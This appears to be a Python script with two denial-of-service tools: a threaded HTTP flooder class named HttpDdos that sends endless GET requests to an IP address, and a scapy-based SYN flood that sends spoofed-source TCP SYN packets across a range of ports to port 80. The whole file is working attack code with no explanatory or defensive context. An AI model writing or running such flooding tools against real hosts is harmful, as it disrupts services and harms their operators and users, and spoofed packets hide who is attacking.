#
from threading import Thread
import requests

status = {"200": 0, "404": 0, "500": 0}


class HttpDdos(Thread):
    def __init__(self, host, port=80):
        super().__init__()
        self.host = host
        self.port = port

    def run(self) -> None:
        while True:
            self.sendHttpRequest(self.host)
            print(status)

    def sendHttpRequest(self, url):
        global status
        try:
            response = requests.get(url).status_code
            status[str(response)] += 1
        except:
            pass

if __name__=='__main__':
    for i in range(10):
        t = HttpDdos("http://191.168.101.101")
        t.start()

    t.join()

from scapy.all import *

tg = "192.168.101.101"
print(tg)
dPort = 80

def synFlood(tg, dPort):
    srcList = ['10.10.10.1', '10.10.10.2', '10.10.10.3', '10.10.10.4']

    for sPort in range(1024, 65535):
        index = random.randrange(4)

        ipLayer = IP(src=srcList[index], dst=tg)
        tcpLayer = TCP(sport=sPort, dport=dPort, flags='S')
        packet = ipLayer/tcpLayer
        send(packet)

synFlood(tg, dPort)
